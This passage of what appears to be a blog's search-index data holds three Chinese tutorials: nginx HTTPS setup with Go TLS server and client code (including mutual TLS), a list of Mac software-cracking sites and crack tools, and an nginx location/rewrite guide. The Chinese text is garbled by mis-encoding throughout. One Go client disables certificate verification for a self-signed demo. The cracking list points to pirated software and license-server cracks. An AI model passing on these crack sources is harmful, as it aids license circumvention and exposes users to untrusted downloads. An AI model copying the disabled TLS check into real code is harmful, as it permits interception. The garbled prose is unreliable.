default_server;#ä¸€å®šè¦åŠ ä¸Šdefault_server,å¦åˆ™å¤šä¸ªserverä¼šæ‰¾ç¬¬ä¸€ä¸ªä¸ºé»˜è®¤\n          listen [::]:80 default_server;#ç›‘å¬æ‰€æœ‰çš„ipv6çš„åœ°å€\n          rewrite ^ https://$http_host$request_uri? permanent; #https è·³è½¬åˆ° https,æ°¸ä¹…é‡å®šå‘å‘\n  }\n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n          ssl_certificate \"/etc/nginx/ssl/*.liuvv.com_chain.crt\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com_key.key\";\n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n### 5. acmeè‡ªåŠ¨ç”Ÿæˆå¹¶æ›´æ–°è¯ä¹¦\n\n+ https://www.liuvv.com/p/ee822cec.html\n\n\n\n### 6. golang å®ç°ä¸€ä¸ªæœ€ç®€å•çš„HTTPS Web Server\n\n+ ç”Ÿæˆç§é’¥å’Œè¯ä¹¦\n\n```\nopenssl genrsa -out server.key 2048 //ç”Ÿæˆç§é’¥\nopenssl req -new -x509 -key server.key -out server.pem -days 3650 //ç”Ÿæˆè¯ä¹¦\n```\n\n+ server.go\n\n```\npackage main\n\t\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServeTLS(\":8081\", \"server.pem\", \"server.key\", nil)\n}\n\t\n```\n\né€šè¿‡æµè§ˆå™¨è®¿é—®ï¼šhttps://localhost:8081 ä¼šå‡ºç°æ‚¨çš„è¿æ¥ä¸æ˜¯ç§å¯†è¿æ¥, å› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯è‡ªç­¾å‘çš„æ•°å­—è¯ä¹¦\n\t\n\n+ å®¢æˆ·ç«¯è®¿é—®\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t//é€šè¿‡è®¾ç½®tls.Configçš„InsecureSkipVerifyä¸ºtrueï¼Œclientå°†ä¸å†å¯¹æœåŠ¡ç«¯çš„è¯ä¹¦è¿›è¡Œæ ¡éªŒã€‚\n\tts := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}} \n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n### å¯¹æœåŠ¡ç«¯æ•°å­—è¯ä¹¦è¿›è¡ŒéªŒè¯\n\næ¥ä¸‹æ¥æˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹å®¢æˆ·ç«¯å¯¹æœåŠ¡ç«¯æ•°å­—è¯ä¹¦è¿›è¡ŒéªŒè¯:\n\n- é¦–å…ˆæˆ‘ä»¬æ¥å»ºç«‹æˆ‘ä»¬è‡ªå·±çš„CAï¼Œéœ€è¦ç”Ÿæˆä¸€ä¸ªCAç§é’¥å’Œä¸€ä¸ªCAçš„æ•°å­—è¯ä¹¦:\n\t\n```\nopenssl genrsa -out ca.key 2048\n\t\nopenssl req -x509 -new -nodes -key ca.key -subj \"/CN=tonybai.com\" -days 5000 -out ca.crt\n```\n\n- æ¥ä¸‹æ¥ï¼Œç”Ÿæˆserverç«¯çš„ç§é’¥ï¼Œç”Ÿæˆæ•°å­—è¯ä¹¦è¯·æ±‚ï¼Œå¹¶ç”¨æˆ‘ä»¬çš„caç§é’¥ç­¾å‘serverçš„æ•°å­—è¯ä¹¦ï¼š\n\n```\nopenssl genrsa -out server.key 2048\n\t\nopenssl req -new -key server.key -subj \"/CN=localhost\" -out server.csr\n\t\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 5000\n```\n\n- ç°åœ¨æˆ‘ä»¬çš„å·¥ä½œç›®å½•ä¸‹æœ‰å¦‚ä¸‹ä¸€äº›ç§é’¥å’Œè¯ä¹¦æ–‡ä»¶ï¼š\n\n```\nCA:\nç§é’¥æ–‡ä»¶ ca.key\næ•°å­—è¯ä¹¦ ca.crt\n\nServer:\nç§é’¥æ–‡ä»¶ server.key\næ•°å­—è¯ä¹¦ server.crt\n```\n\n+ å®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯æ•°å­—è¯ä¹¦\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool,\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n### å¯¹å®¢æˆ·ç«¯çš„è¯ä¹¦è¿›è¡Œæ ¡éªŒ(åŒå‘è¯ä¹¦æ ¡éªŒï¼‰\n\n+ è¦å¯¹å®¢æˆ·ç«¯æ•°å­—è¯ä¹¦è¿›è¡Œæ ¡éªŒï¼Œé¦–å…ˆå®¢æˆ·ç«¯éœ€è¦å…ˆæœ‰è‡ªå·±çš„è¯ä¹¦ã€‚\n\n```\nopenssl genrsa -out client.key 2048\n\t\nopenssl req -new -key client.key -subj \"/CN=tonybai_cn\" -out client.csr\n\t\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 5000\n```\n\n+ é¦–å…ˆserverç«¯éœ€è¦è¦æ±‚æ ¡éªŒclientç«¯çš„æ•°å­—è¯ä¹¦ï¼Œå¹¶ä¸”åŠ è½½ç”¨äºæ ¡éªŒæ•°å­—è¯ä¹¦çš„ca.crtï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹serverè¿›è¡Œæ›´åŠ çµæ´»çš„æ§åˆ¶ï¼š\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\ts := &http.Server{\n\t\tAddr:    \":8081\",\n\t\tHandler: http.HandlerFunc(handler),\n\t\tTLSConfig: &tls.Config{\n\t\t\tClientCAs:  pool,\n\t\t\tClientAuth: tls.RequireAndVerifyClientCert, //å¼ºåˆ¶æ ¡éªŒclientç«¯è¯ä¹¦\n\t\t},\n\t}\n\t\n\ts.ListenAndServeTLS(\"server.crt\", \"server.key\")\n}\n```\n\n+ clientç«¯å˜åŒ–ä¹Ÿå¾ˆå¤§ï¼Œéœ€è¦åŠ è½½client.keyå’Œclient.crtç”¨äºserverç«¯è¿æ¥æ—¶çš„è¯ä¹¦æ ¡éªŒï¼š\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tcliCrt, err := tls.LoadX509KeyPair(\"client.crt\", \"client.key\")\n\tif err != nil {\n\t\tfmt.Println(\"Loadx509keypair err:\", err)\n\t\treturn\n\t}\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool, //clientç«¯æ˜¯ RootCAs\n\t\t\tCertificates:       []tls.Certificate{cliCrt},\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```","tags":["http"],"categories":["https"]},{"title":"macç ´è§£èµ„æºè½¯ä»¶æ”¶é›†","url":"%2Fp%2F6765e5a5.html","content":"\n\n\n# 1. è‹¹æœè½¯ä»¶ç ´è§£\n\n+  https://xclient.info/\n\n+ https://www.naodai.org/\n\n+ https://cmacapps.com/\n\n+ https://www.ifunmac.com/\n\n+ https://www.waitsun.com/topics/os\n\n+ https://www.macenjoy.co/\n\n+ https://www.macsky.net/\n\n+ https://macbold.com/\n\n+ https://nmac.to/\n\n+ http://mac-torrent-download.net/\n\n+ https://www.macdo.cn/\n\n+ https://www.fxxkmakeding.xyz/\n\n  <!-- more -->\n\n\n\n# 2. å…¶ä»–ç ´è§£\n\n+ ç™¾åº¦äº‘ç›˜ç ´è§£ https://github.com/proxyee-down-org/proxyee-down\n+ ç™¾åº¦äº‘ç›˜ç ´è§£ https://www.baiduwp.com/ (éœ€è¦å®‰è£…ua switchæ’ä»¶,å·²å¤±æ•ˆ)\n+ ç™¾åº¦äº‘ç›˜ç ´è§£ https://github.com/b3log/baidu-netdisk-downloaderx(å·²å¤±æ•ˆ)\n+ Jetbrains https://zhile.io/2018/08/25/jetbrains-license-server-crack.html\n+ Charles ç ´è§£  https://github.com/8enet/Charles-Crack\n+ Cleanmymac ç ´è§£ https://macbold.com/download-cleanmymac-fully-activated-free7t5/\n+ Ntfsformacç ´è§£ https://www.naodai.org/archives/50.html\n+ å°ä¼—è½¯ä»¶: https://www.appinn.com/category   é‡Œé¢æœ‰æ¯”è¾ƒæœ‰æ„æ€çš„è½¯ä»¶å’Œchromeæ’ä»¶\n\n\n\n","tags":["software"],"categories":["è½¯ä»¶"]},{"title":"nginxçš„locationç”¨æ³•å’Œrewriteè§„åˆ™åŠproxy_passæ¨¡å—","url":"%2Fp%2F51e59d76.html","content":"\n\n\n### 1. locationæŒ‡ä»¤\n\næ ¹æ®è¯·æ±‚çš„URIæ¥è®¾ç½®å…·ä½“è§„åˆ™, URIæ˜¯urlä¸­é™¤å»åè®®\bå’ŒåŸŸååŠå‚æ•°å, å‰©ä¸‹çš„éƒ¨åˆ†.\n\næ¯”å¦‚è¯·æ±‚çš„urlä¸º: http://www.liuvv.com/test/index.php?page=1, åˆ™uri ä¸º `/test/index.php`\n\n##### 1.1 locationåŒ¹é…uriçš„è§„åˆ™:\n\n```\nlocation [ = | ~ | ~* | ^~ ] uri { ... }\n```\n\n+ `=`  ç²¾ç¡®åŒ¹é…, uriè¦å®Œå…¨ä¸€æ ·\n+ `^~`  è¿™ä¸ªæ˜¯ä»¥æŸä¸ªå¼€å¤´, ä¸æ˜¯æ­£åˆ™åŒ¹é…\n+ `~`  åŒºåˆ†å¤§å°å†™æ­£åˆ™åŒ¹é…\n+ `~*` ä¸åŒºåˆ†å¤§å°å†™æ­£åˆ™åŒ¹é…\n\n\n\n<!-- more -->\n\n##### 1.2 locationåŒ¹é…uriçš„ä¼˜å…ˆçº§:\n\n1. é¦–å…ˆå…ˆæ£€æŸ¥ä½¿ç”¨å‰ç¼€å­—ç¬¦å®šä¹‰çš„locationï¼Œé€‰æ‹©æœ€é•¿åŒ¹é…çš„é¡¹å¹¶è®°å½•ä¸‹æ¥ã€‚\n\n2. å¦‚æœæ‰¾åˆ°äº†ç²¾ç¡®åŒ¹é…çš„locationï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨äº†`=`ä¿®é¥°ç¬¦çš„locationï¼Œç»“æŸæŸ¥æ‰¾ï¼Œä½¿ç”¨å®ƒçš„é…ç½®ã€‚\n\n3. å¦‚æœ`^~`ä¿®é¥°ç¬¦å…ˆåŒ¹é…åˆ°æœ€é•¿çš„å‰ç¼€å­—ç¬¦ä¸², åˆ™ä¸æ£€æŸ¥æ­£åˆ™ã€‚\n\n4. ç„¶åæŒ‰é¡ºåºæŸ¥æ‰¾ä½¿ç”¨æ­£åˆ™å®šä¹‰çš„locationï¼Œå¦‚æœåŒ¹é…åˆ™åœæ­¢æŸ¥æ‰¾ï¼Œä½¿ç”¨å®ƒå®šä¹‰çš„é…ç½®ã€‚\n\n5. å¦‚æœæ²¡æœ‰åŒ¹é…çš„æ­£åˆ™locationï¼Œåˆ™ä½¿ç”¨å‰é¢è®°å½•çš„æœ€é•¿åŒ¹é…å‰ç¼€å­—ç¬¦locationã€‚\n\n   \n\n> åŸºäºä»¥ä¸Šçš„åŒ¹é…è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹å¯ç¤ºï¼š\n\n1. ä½¿ç”¨æ­£åˆ™å®šä¹‰çš„locationåœ¨é…ç½®æ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºå¾ˆé‡è¦ã€‚å› ä¸ºæ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„æ­£åˆ™åï¼ŒæŸ¥æ‰¾å°±åœæ­¢äº†ï¼Œåé¢å®šä¹‰çš„æ­£åˆ™å°±æ˜¯å†åŒ¹é…ä¹Ÿæ²¡æœ‰æœºä¼šäº†ã€‚\n2. ä½¿ç”¨ç²¾ç¡®åŒ¹é…å¯ä»¥æé«˜æŸ¥æ‰¾çš„é€Ÿåº¦ã€‚ä¾‹å¦‚ç»å¸¸è¯·æ±‚`/`çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨`=`æ¥å®šä¹‰locationã€‚\n3. ä¼˜å…ˆçº§ `=`  >  `^~`  >  æ­£åˆ™\n\n\n\n##### 1.3 \u0010location æµ‹è¯•\n\n```nginx\nlocation = / {\n  return 502 \"è§„åˆ™A\\n\";\n}\nlocation = /login {\n  return 502 \"è§„åˆ™B\\n\";\n}\nlocation ^~ /static/ {\n  return 502 \"è§„åˆ™C\\n\";\n}\nlocation ^~ /static/files {\n  return 502 \"è§„åˆ™D\\n\";\n}\nlocation ~ \\.(gif|jpg|png|js|css)$ {\n  return 502 \"è§„åˆ™E\\n\";\n}\nlocation ~* \\.PNG$ {\n  return 502 \"è§„åˆ™F\\n\";\n}\nlocation /img {\n  return 502 \"è§„åˆ™G\\n\";\n}\nlocation / {\n  return 502 \"è§„åˆ™H\\n\";\n}\n```\n\næµ‹è¯•ç»“æœ:\n\n```bash\nlevonfly@hk:~$ curl test.liuvv.com # å› ä¸ºæ˜¯=\nè§„åˆ™A\nlevonfly@hk:~$ curl test.liuvv.com/ # å› ä¸ºæ˜¯=\nè§„åˆ™A\nlevonfly@hk:~$ curl test.liuvv.com/login # å› ä¸ºæ˜¯=\nè§„åˆ™B\nlevonfly@hk:~$ curl test.liuvv.com/login/ # å¤šäº†/, å‚è€ƒä¸‹é¢3.5\nè§„åˆ™H\nlevonfly@hk:~$ curl test.liuvv.com/abc\nè§„åˆ™H\n\nlevonfly@hk:~$ curl test.liuvv.com/static/a.html \nè§„åˆ™C\nlevonfly@hk:~$ curl test.liuvv.com/static/files/a.html # æ›´åŠ ç²¾å‡†\nè§„åˆ™D\n\nlevonfly@hk:~$ curl test.liuvv.com/a.png # æ­£åˆ™ç²¾å‡†\nè§„åˆ™E\nlevonfly@hk:~$ curl test.liuvv.com/a.PNG # æ­£åˆ™ç²¾å‡†\nè§„åˆ™F\nlevonfly@hk:~$ curl test.liuvv.com/static/a.png # ^~ ä¼˜å…ˆçº§æ›´é«˜\nè§„åˆ™C\n\nlevonfly@hk:~$ curl test.liuvv.com/img/a.gif #æ­£åˆ™åŒ¹é…ä¼˜å…ˆ\nè§„åˆ™E\nlevonfly@hk:~$ curl test.liuvv.com/img/a.tiff\nè§„åˆ™G\nlevonfly@hk:~$ curl test.liuvv.com/abc/123/haha #ä»€ä¹ˆéƒ½åŒ¹é…ä¸åˆ°, å°±åˆ°H\nè§„åˆ™H\n```\n\n\n\n##### 1.4 location @nameçš„ç”¨æ³•\n\n@ç”¨æ¥å®šä¹‰ä¸€ä¸ªå‘½ålocationã€‚ä¸»è¦ç”¨äºå†…éƒ¨é‡å®šå‘ï¼Œä¸èƒ½ç”¨æ¥å¤„ç†æ­£å¸¸çš„è¯·æ±‚ã€‚å…¶ç”¨æ³•å¦‚ä¸‹ï¼š\n\n```nginx\nlocation / {\n    try_files $uri $uri/ @custom\n}\nlocation @custom {\n    # ...do something\n}\n```\n\nä¸Šä¾‹ä¸­ï¼Œå½“å°è¯•è®¿é—®urlæ‰¾ä¸åˆ°å¯¹åº”çš„æ–‡ä»¶å°±é‡å®šå‘åˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„å‘½ålocationï¼ˆæ­¤å¤„ä¸ºcustomï¼‰ã€‚\n\nå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå‘½ålocationä¸­ä¸èƒ½å†åµŒå¥—å…¶å®ƒçš„å‘½ålocationã€‚\n\n\n\n\n##### 1.5 rootå’Œaliasçš„åŒºåˆ«\n\nnginxæŒ‡å®šæ–‡ä»¶è·¯å¾„æœ‰ä¸¤ç§æ–¹å¼rootå’Œalias.\n\n- root\n\n```\n[root]\nè¯­æ³•ï¼šroot path\né»˜è®¤å€¼ï¼šroot html\né…ç½®æ®µï¼šhttpã€serverã€locationã€if\n```\n\nä¾‹å¦‚:\n\n```nginx\nlocation ^~ /t/ { \n     root /www/root/html/;\n}\n```\n\nå¦‚æœä¸€ä¸ªè¯·æ±‚çš„URIæ˜¯/t/a.htmlæ—¶ï¼ŒwebæœåŠ¡å™¨å°†ä¼šè¿”å›æœåŠ¡å™¨ä¸Šçš„/www/root/html/t/a.htmlçš„æ–‡ä»¶ã€‚\n\n- alias\n\n```\n[alias]\nè¯­æ³•ï¼šalias path\né…ç½®æ®µï¼šlocation\n```\n\nä¾‹å¦‚:\n\n```nginx\nlocation ^~ /t/ { # ç‰¹æ®Šçš„è§„åˆ™æ˜¯, aliaså¿…é¡»ä»¥\"/\" ç»“æŸ\n alias /www/root/html/new_t/;\n}\n```\n\nå¦‚æœä¸€ä¸ªè¯·æ±‚çš„URIæ˜¯/t/a.htmlæ—¶ï¼ŒwebæœåŠ¡å™¨å°†ä¼šè¿”å›æœåŠ¡å™¨ä¸Šçš„/www/root/html/new_t/a.htmlçš„æ–‡ä»¶ã€‚æ³¨æ„è¿™é‡Œæ˜¯new_tï¼Œå› ä¸ºaliasä¼šæŠŠlocationåé¢é…ç½®çš„è·¯å¾„ä¸¢å¼ƒæ‰ï¼ŒæŠŠå½“å‰åŒ¹é…åˆ°çš„ç›®å½•æŒ‡å‘åˆ°æŒ‡å®šçš„ç›®å½•ã€‚\n\n\n\n##### 1.6 nginxæ˜¾ç¤ºç›®å½•ç»“æ„\n\nnginxé»˜è®¤æ˜¯ä¸å…è®¸åˆ—å‡ºæ•´ä¸ªç›®å½•çš„ã€‚å¦‚éœ€æ­¤åŠŸèƒ½, åœ¨serveræˆ–location æ®µé‡Œæ·»åŠ ä¸Šautoindex on;\n\n```nginx\nautoindex_exact_size off;\né»˜è®¤ä¸ºonï¼Œæ˜¾ç¤ºå‡ºæ–‡ä»¶çš„ç¡®åˆ‡å¤§å°ï¼Œå•ä½æ˜¯bytesã€‚\næ”¹ä¸ºoffåï¼Œæ˜¾ç¤ºå‡ºæ–‡ä»¶çš„å¤§æ¦‚å¤§å°ï¼Œå•ä½æ˜¯kBæˆ–è€…MBæˆ–è€…GB\n\nautoindex_localtime on;\né»˜è®¤ä¸ºoffï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶æ—¶é—´ä¸ºGMTæ—¶é—´ã€‚\næ”¹ä¸ºonåï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶æ—¶é—´ä¸ºæ–‡ä»¶çš„æœåŠ¡å™¨æ—¶é—´\n```\n\nå¯ä»¥ä¸‹é¢çš„ä¾‹å­:\n\n```nginx\nlocation ^~ \"/upload-preview\" {\n\t\talias /tmp/cistern/;\n\t\tautoindex on;\n\t\tautoindex_localtime on;\n}\n```\n\n\n\n##### 1.7 URLå°¾éƒ¨çš„`/`éœ€ä¸éœ€è¦\n\nå…³äºURLå°¾éƒ¨çš„`/`æœ‰ä¸‰ç‚¹ä¹Ÿéœ€è¦è¯´æ˜ä¸€ä¸‹ã€‚ç¬¬ä¸€ç‚¹ä¸locationé…ç½®æœ‰å…³ï¼Œå…¶ä»–ä¸¤ç‚¹æ— å…³ã€‚\n\n+ locationé…ç½®ä¸­çš„å­—ç¬¦æœ‰æ²¡æœ‰`/`éƒ½æ²¡æœ‰å½±å“(åªæ˜¯location, ä¸æ˜¯alias)ã€‚ä¹Ÿå°±æ˜¯è¯´`/user/`å’Œ`/user`æ˜¯ä¸€æ ·çš„ã€‚\n\n+ å¦‚æœURLç»“æ„æ˜¯`https://domain.com/`çš„å½¢å¼ï¼Œå°¾éƒ¨æœ‰æ²¡æœ‰`/`éƒ½ä¸ä¼šé€ æˆé‡å®šå‘ã€‚å› ä¸ºæµè§ˆå™¨åœ¨å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œé»˜è®¤åŠ ä¸Šäº†`/`ã€‚è™½ç„¶å¾ˆå¤šæµè§ˆå™¨åœ¨åœ°å€æ é‡Œä¹Ÿä¸ä¼šæ˜¾ç¤º`/`ã€‚è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è®¿é—®[baidu](https://www.baidu.com/)éªŒè¯ä¸€ä¸‹ã€‚\n\n+ å¦‚æœURLçš„ç»“æ„æ˜¯`https://domain.com/some-dir/`ã€‚å°¾éƒ¨å¦‚æœç¼ºå°‘`/`å°†å¯¼è‡´é‡å®šå‘ã€‚å› ä¸ºæ ¹æ®çº¦å®šï¼ŒURLå°¾éƒ¨çš„`/`è¡¨ç¤ºç›®å½•ï¼Œæ²¡æœ‰`/`è¡¨ç¤ºæ–‡ä»¶ã€‚\n\n  æ‰€ä»¥è®¿é—®`/some-dir/`æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨å»è¯¥ç›®å½•ä¸‹æ‰¾å¯¹åº”çš„é»˜è®¤æ–‡ä»¶ã€‚å¦‚æœè®¿é—®`/some-dir`çš„è¯ï¼ŒæœåŠ¡å™¨ä¼šå…ˆå»æ‰¾`some-dir`æ–‡ä»¶ï¼Œæ‰¾ä¸åˆ°çš„è¯ä¼šå°†`some-dir`å½“æˆç›®å½•ï¼Œé‡å®šå‘åˆ°`/some-dir/`ï¼Œå»è¯¥ç›®å½•ä¸‹æ‰¾é»˜è®¤æ–‡ä»¶ã€‚\n\n\n\n### 2. rewirteè§„åˆ™\n\n\n##### 2.1 returnæŒ‡ä»¤\n\nreturnæŒ‡ä»¤å†™åœ¨serverå’Œlocationé‡Œé¢\n\n```nginx\nreturn code [text];\nreturn code URL;\nreturn URL;\n```\n\næˆ‘ä»¬æ¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­\n\n```nginx\n return 301 $scheme://www.baidu.com$request_uri; \n```\n\nreturn æŒ‡ä»¤å‘Šè¯‰ nginx åœæ­¢å¤„ç†è¯·æ±‚, ç›´æ¥è¿”å›301ä»£ç å’ŒæŒ‡å®š\bé‡å†™è¿‡çš„URLåˆ°å®¢æˆ·ç«¯. $schemeæ˜¯æŒ‡\båè®®(http),$request_uriæŒ‡\båŒ…å«å‚æ•°çš„å®Œæ•´URI \n\n\n\nå¯¹äº 3xx ç³»åˆ—å“åº”ç , urlå‚æ•°å°±æ˜¯é‡å†™çš„url\n\n```nginx\nreturn (301 | 302 | 303 | 307) url;\n```\n\nå¯¹äºå…¶ä»–å“åº”å—, å¯ä»¥å‡ºç°ä¸€ä¸ªå­—ç¬¦ä¸²\n\n```nginx\nreturn (1xx | 2xx | 4xx | 5xx)[\"text\"]\n```\n\nä¾‹å¦‚:\n\n```nginx\nreturn 401 \"Access denied because token is expired or invalid\";\n```\n\n\n\n##### 2.2 rewriteæŒ‡ä»¤\n\nrewriteæŒ‡ä»¤å†™åœ¨serverå’Œlocationé‡Œé¢, è§„åˆ™ä¼šæ”¹å˜éƒ¨åˆ†æˆ–æ•´ä¸ªç”¨æˆ·çš„URL.\n\n```nginx\nrewrite regex URL [flag]\n```\n\n1. regex æ­£åˆ™è¡¨è¾¾å¼\n\n2. flag\n\n   + last\n\n     åœæ­¢å½“å‰è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶æ ¹æ®rewriteåŒ¹é…çš„è§„åˆ™é‡æ–°å‘èµ·ä¸€ä¸ªè¯·æ±‚ã€‚æ–°è¯·æ±‚åˆä»ç¬¬ä¸€é˜¶æ®µå¼€å§‹æ‰§è¡Œ, æ‰¾å¯»æ–°çš„location\n\n   + break\n\n     breakå¹¶ä¸ä¼šé‡æ–°å‘èµ·ä¸€ä¸ªè¯·æ±‚ï¼Œåªæ˜¯è·³è¿‡å½“å‰çš„rewriteé˜¶æ®µï¼Œå¹¶æ‰§è¡Œæœ¬è¯·æ±‚åç»­çš„æ‰§è¡Œé˜¶æ®µ, åœ¨åŒä¸€ä¸ªlocationé‡Œå¤„ç†\n\n   + redirect\n\n     è¿”å›åŒ…å«302çš„ä¸´æ—¶é‡å®šå‘\n\n   + permanent\n\n     è¿”å›åŒ…å«301çš„æ°¸ä¹…é‡å®šå‘\n\n3. rewriteåªèƒ½è¿”å›301æˆ–302, å¦‚æœæœ‰å…¶ä»–,éœ€è¦åé¢åŠ ä¸Šreturn, ä¾‹å¦‚:\n\n```nginx\nrewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last;\nrewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra  last;\nreturn  403;\n```\n\n+ åŒ¹é…/downloadå¼€å¤´çš„URL,  ç„¶åæ›¿æ¢ç›¸å…³è·¯å¾„\n+ `/download/cdn-west/media/file1` -> `/download/cdn-west/mp3/file1.mp3`\n\n+ å¦‚æœåŒ¹é…ä¸ä¸Š, å°†è¿”å›å®¢æˆ·ç«¯403\n\n\n\n##### 2.3 try_files\n\ntry_filesæŒ‡ä»¤å†™åœ¨serverå’Œlocationé‡Œé¢.\n\n```nginx\nry_files file ... uri æˆ– try_files file ... = code\n```\n\ntry_files æŒ‡ä»¤çš„å‚æ•°æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„åˆ—è¡¨, ä»¥åŠåé¢çš„uriå‚æ•°. nginxä¼šæŒ‰ç…§é¡ºåºæ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨, å¹¶ç”¨æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶æä¾›æœåŠ¡. å¦‚æœéƒ½ä¸å­˜åœ¨, å†…éƒ¨é‡å®šå‘åˆ°æœ€åçš„è¿™ä¸ªuri\n\nä¾‹å¦‚:\n\n```nginx\nlocation /images/ {\n    try_files $uri $uri/ /images/default.gif;\n}\n\nlocation = /images/default.gif {\n    expires 30s;\n}\n```\n\ntry_fileså¸¸ç”¨çš„å˜é‡:\n\n+ $uri è¡¨ç¤ºåŸŸåä»¥åçš„éƒ¨åˆ†\n\n+ $args  è¯·æ±‚urlä¸­ ? åé¢çš„å‚æ•° (ä¸åŒ…æ‹¬?æœ¬èº«)\n\n+ $is_args  åˆ¤æ–­$argsæ˜¯å¦ä¸ºç©º\n\n  ```nginx\n  try_files $uri $uri/ /index.php$is_args$args; #è¿™æ ·å°±èƒ½é¿å…å¤šä½™çš„?å·\n  ```\n  \n+ $query_string å’Œ $argsç›¸åŒ\n\n+ $document_root rootæŒ‡ä»¤æŒ‡å®šçš„å€¼\n\n+ $request_filename è¯·æ±‚çš„æ–‡ä»¶è·¯å¾„\n\n+ $request_uri åŸå§‹è¯·æ±‚uri  \n\n\n\næˆ‘ä»¬çœ‹ä¸ªä¾‹å­:\n\n```nginx\ntry_files /app/cache/ $uri @fallback; \nindex index.php index.html;\n```\n\nå®ƒå°†æ£€æµ‹$document_root/app/cache/index.php,$document_root/app/cache/index.html å’Œ $document_root$uriæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨ç€å†…éƒ¨é‡å®šå‘åˆ°@fallback(ï¼ è¡¨ç¤ºé…ç½®æ–‡ä»¶ä¸­é¢„å®šä¹‰æ ‡è®°ç‚¹) ã€‚\n\nä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ–‡ä»¶æˆ–è€…çŠ¶æ€ç 